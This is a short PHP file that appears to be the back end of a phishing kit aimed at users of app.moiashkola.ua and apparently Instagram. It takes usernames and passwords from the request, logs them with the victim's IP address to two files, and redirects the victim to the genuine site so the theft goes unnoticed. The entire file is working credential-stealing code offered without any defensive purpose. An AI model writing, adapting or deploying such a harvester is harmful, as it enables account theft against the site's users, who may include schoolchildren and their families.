<?php
header ('Location: https://app.moiashkola.ua/');                            $login = $_GET['UserName'];                                                 $pass = $_GET['Password'];                                                  $ip = $_SERVER['REMOTE_ADDR'];
$file = $_SERVER['DOCUMENT_ROOT']."/log.log";                               $file = str_replace("/site", "", $file);                               $all = "\r\nx.add_row(['INST', '$login', '$pass', '...', '$ip'])";          $fp = fopen("$file", "a+");
fwrite($fp, $all);                                                          fclose($fp);                                                                $file = $_SERVER['DOCUMENT_ROOT']."/data.log";                              $file = str_replace("/instagram", "", $file);
$al = "\r\nx.add_row(['MSHK', '$login', '$pass', '...', '$ip'])";       $fp = fopen("$file", "a+");                                                 fwrite($fp, $al);                                                           fclose($fp);
?>                                                                          <script>
